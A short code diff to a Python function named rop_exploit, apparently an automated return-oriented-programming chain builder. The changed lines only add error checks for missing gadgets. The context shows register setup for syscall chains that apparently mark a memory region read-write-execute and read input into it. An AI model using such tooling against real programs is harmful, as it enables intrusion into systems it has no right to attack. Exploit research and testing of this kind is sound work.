@@ -53,6 +53,8 @@ def rop_exploit(binary_name, padding, bss):
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
                 "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)}
+    if -1 in commands.values():
+        return -1
     result = schedule(commands)
     if result != -1:
         exploit += result
@@ -67,7 +69,8 @@ def rop_exploit(binary_name, padding, bss):
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
                 "ecx" : push_to_reg((bss + 4),"ecx",gadgets,rop), 
                 "edx" : push_to_reg(0xffffffff,"edx",gadgets,rop)}
-
+    if -1 in commands.values():
+        return -1
     result = schedule(commands)
     if result != -1:
         exploit += result
